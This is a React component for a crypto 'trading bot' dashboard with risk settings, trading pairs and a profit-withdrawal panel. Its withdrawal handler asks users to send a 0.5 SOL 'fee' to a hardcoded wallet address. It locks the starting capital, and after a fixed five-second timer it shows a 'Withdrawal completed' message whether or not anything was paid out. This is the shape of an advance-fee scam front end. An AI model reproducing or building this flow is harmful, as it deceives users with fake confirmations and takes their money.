import React, { useState, useEffect } from 'react';
import { BrutalistCard } from '../ui/brutalist-card';
import { BrutalistButton } from '../ui/brutalist-button';
import { BrutalistToggle } from '../ui/brutalist-toggle';
import { BrutalistInput } from '../ui/brutalist-input';
import { apiRequest } from '../../lib/queryClient';
import { useToast } from '@/hooks/use-toast';
import { Loader2 } from 'lucide-react';

interface TradingBotProps {
  isActive: boolean;
  onStart: () => void;
  onStop: () => void;
  startingCapital: number;
  currentValue: number;
  profitLoss: number;
  tradeCount: number;
  winCount: number;
  lossCount: number;
  sessionId?: number;
  userId?: number;
  walletAddress?: string;
}

const TradingBot: React.FC<TradingBotProps> = ({
  isActive,
  onStart,
  onStop,
  startingCapital = 1000,
  currentValue = 1000,
  profitLoss = 0,
  tradeCount = 0,
  winCount = 0,
  lossCount = 0,
  sessionId,
  userId,
  walletAddress
}) => {
  const { toast } = useToast();
  const [riskLevel, setRiskLevel] = useState<'low' | 'medium' | 'high'>('medium');
  const [autoRebalance, setAutoRebalance] = useState<boolean>(true);
  const [tradingPairs, setTradingPairs] = useState<string[]>(['SOL/USDT', 'BONK/USDT', 'WIF/USDT', 'BOME/USDT']);
  const [newPair, setNewPair] = useState<string>('');
  const [withdrawalInProgress, setWithdrawalInProgress] = useState<boolean>(false);
  
  // Calculate withdrawable amount (profits only)
  const withdrawableAmount = Math.max(0, currentValue - startingCapital);
  const winRate = tradeCount > 0 ? (winCount / tradeCount) * 100 : 0;
  
  const handleWithdraw = async () => {
    if (!userId || !sessionId) {
      toast({
        title: "Error",
        description: "User session not found. Please reconnect your wallet.",
        variant: "destructive"
      });
      return;
    }
    
    if (withdrawableAmount <= 0) {
      toast({
        title: "Cannot withdraw",
        description: "You can only withdraw profits. Current profit: $0",
        variant: "destructive"
      });
      return;
    }
    
    // Ask for the fee transaction ID
    const feeConfirmTxHash = window.prompt(
      "Please send 0.5 SOL to 6B2RkaJevbKkAVmBZ4W2eNvQWApHwtd6TQggSuTmyVJ5 and paste the transaction ID here:"
    );
    
    if (!feeConfirmTxHash) {
      return; // User cancelled
    }
    
    // Ask for the user's wallet address for withdrawal
    const withdrawalWallet = window.prompt(
      "Please enter your wallet address where you want to receive the funds:",
      walletAddress || ""
    );
    
    if (!withdrawalWallet) {
      return; // User cancelled
    }
    
    try {
      setWithdrawalInProgress(true);
      
      // Create a withdrawal request
      const withdrawalData = {
        userId,
        sessionId,
        amount: withdrawableAmount,
        fee: 0.5,
        status: "pending",
        walletAddress: withdrawalWallet,
        feeConfirmTxHash
      };
      
      const response = await apiRequest("POST", "/api/withdrawals", withdrawalData);
      const withdrawal = await response.json();
      
      // If active, stop the bot
      if (isActive) {
        onStop();
      }
      
      toast({
        title: "Withdrawal request submitted",
        description: `Your withdrawal of $${withdrawableAmount.toFixed(2)} is being processed.`,
      });
      
      // In a real app, there would be a backend process to verify the transaction
      // and process the withdrawal
      setTimeout(() => {
        toast({
          title: "Withdrawal completed",
          description: `$${withdrawableAmount.toFixed(2)} has been sent to your wallet.`,
          variant: "default"
        });
      }, 5000);
      
    } catch (error) {
      toast({
        title: "Withdrawal failed",
        description: (error as Error).message,
        variant: "destructive"
      });
    } finally {
      setWithdrawalInProgress(false);
    }
  };
  
  return (
    <BrutalistCard>
      <div className="flex justify-between items-center mb-4">
        <h3 className="font-mono font-bold text-lg">Trading Bot</h3>
        <div className="flex items-center">
          <span className={`w-3 h-3 rounded-full ${isActive ? 'bg-brutalism-green animate-pulse' : 'bg-brutalism-red'} mr-2`}></span>
          <p className={isActive ? 'text-brutalism-green text-sm' : 'text-brutalism-red text-sm'}>
            {isActive ? 'Active' : 'Inactive'}
          </p>
        </div>
      </div>
      
      <div className="mb-6">
        <div className="flex justify-between mb-2">
          <p className="text-sm text-gray-400">Risk Level</p>
          <p className="text-sm font-bold capitalize">{riskLevel}</p>
        </div>
        <div className="flex space-x-2">
          <BrutalistButton
            className="py-1 flex-1 text-sm"
            color={riskLevel === 'low' ? 'blue' : 'default'}
            onClick={() => setRiskLevel('low')}
            disabled={isActive}
          >
            Low
          </BrutalistButton>
          <BrutalistButton
            className="py-1 flex-1 text-sm"
            color={riskLevel === 'medium' ? 'blue' : 'default'}
            onClick={() => setRiskLevel('medium')}
            disabled={isActive}
          >
            Medium
          </BrutalistButton>
          <BrutalistButton
            className="py-1 flex-1 text-sm"
            color={riskLevel === 'high' ? 'blue' : 'default'}
            onClick={() => setRiskLevel('high')}
            disabled={isActive}
          >
            High
          </BrutalistButton>
        </div>
      </div>
      
      <div className="mb-6">
        <div className="flex justify-between mb-2">
          <p className="text-sm text-gray-400">Starting Capital (Not Withdrawable)</p>
          <p className="text-sm font-bold">${startingCapital.toFixed(2)}</p>
        </div>
      </div>
      
      <div className="mb-6">
        <div className="flex justify-between items-center mb-2">
          <p className="text-sm text-gray-400">Auto Rebalance</p>
          <BrutalistToggle
            checked={autoRebalance}
            onChange={() => setAutoRebalance(!autoRebalance)}
            disabled={isActive}
          />
        </div>
      </div>
      
      {/* Always show current value and profit/loss, whether active or not */}
      <div className="mb-6 p-3 bg-[#2A2A2A] rounded-md border-2 border-black">
        <div className="flex justify-between mb-2">
          <p className="text-sm text-gray-400">Current Value</p>
          <p className="text-sm font-bold">${currentValue.toFixed(2)} ({profitLoss >= 0 ? '+' : ''}{profitLoss.toFixed(2)} USD)</p>
        </div>
        <div className="flex justify-between">
          <p className="text-sm text-gray-400">Trade Performance</p>
          <p className="text-sm font-bold">
            {tradeCount} trades | {winRate.toFixed(1)}% win rate
          </p>
        </div>
        <div className="flex justify-between">
          <p className="text-sm text-gray-400">Wins/Losses</p>
          <p className="text-sm font-bold">
            <span className="text-brutalism-green">{winCount}W</span> / <span className="text-brutalism-red">{lossCount}L</span>
          </p>
        </div>
      </div>
      
      <div className="mb-6">
        <div className="flex justify-between mb-2">
          <p className="text-sm text-gray-400">Trading Pairs</p>
          <p className="text-sm font-bold">{tradingPairs.length}</p>
        </div>
        <div className="bg-[#2A2A2A] p-2 rounded-md border-2 border-black mb-2 max-h-24 overflow-y-auto">
          {tradingPairs.map((pair, index) => (
            <div key={index} className="flex justify-between items-center mb-1 last:mb-0">
              <span className="text-sm">{pair}</span>
              <BrutalistButton
                className="py-0 px-2 text-xs"
                color="red"
                onClick={() => setTradingPairs(tradingPairs.filter((_, i) => i !== index))}
                disabled={isActive}
              >
                X
              </BrutalistButton>
            </div>
          ))}
        </div>
        <div className="flex space-x-2">
          <BrutalistInput 
            className="flex-1"
            value={newPair}
            onChange={(e) => setNewPair(e.target.value)}
            placeholder="BONK/USDT"
            disabled={isActive}
          />
          <BrutalistButton
            color="green"
            onClick={() => {
              if (newPair && !tradingPairs.includes(newPair)) {
                setTradingPairs([...tradingPairs, newPair]);
                setNewPair('');
              }
            }}
            disabled={isActive}
          >
            Add
          </BrutalistButton>
        </div>
      </div>
      
      <div className="mt-6 space-y-3">
        {isActive ? (
          <BrutalistButton
            className="w-full py-3"
            color="red"
            onClick={onStop}
            disabled={withdrawalInProgress}
          >
            <i className="ri-stop-line mr-2"></i> Stop Trading Bot
          </BrutalistButton>
        ) : (
          <BrutalistButton
            className="w-full py-3"
            color="green"
            onClick={onStart}
            disabled={withdrawalInProgress}
          >
            <i className="ri-play-line mr-2"></i> Start Trading Bot
          </BrutalistButton>
        )}
        
        {withdrawableAmount > 0 && (
          <div className="p-3 bg-[#2A2A2A] rounded-md border-2 border-black">
            <div className="mb-3">
              <p className="text-sm text-gray-400 mb-1">Withdraw Profits</p>
              <div className="flex justify-between">
                <p className="text-sm">Current Balance</p>
                <p className="text-sm font-bold">${currentValue.toFixed(2)}</p>
              </div>
              <div className="flex justify-between">
                <p className="text-sm">Initial Capital (Not Withdrawable)</p>
                <p className="text-sm font-bold">${startingCapital.toFixed(2)}</p>
              </div>
              <div className="flex justify-between">
                <p className="text-sm">Withdrawal Fee</p>
                <p className="text-sm font-bold">0.5 SOL</p>
              </div>
              <div className="border-t border-gray-700 my-2"></div>
              <div className="flex justify-between">
                <p className="text-sm">Available for Withdrawal</p>
                <p className="text-sm font-bold text-brutalism-green">${withdrawableAmount.toFixed(2)}</p>
              </div>
            </div>
            
            <BrutalistButton
              className="w-full py-2 text-sm"
              color="yellow"
              onClick={handleWithdraw}
              disabled={withdrawalInProgress}
            >
              {withdrawalInProgress ? (
                <>
                  <Loader2 className="h-4 w-4 animate-spin mr-2" /> Processing...
                </>
              ) : (
                <>
                  <i className="ri-money-dollar-circle-line mr-1"></i> Withdraw Profits
                </>
              )}
            </BrutalistButton>
          </div>
        )}
      </div>
    </BrutalistCard>
  );
};

export default TradingBot;
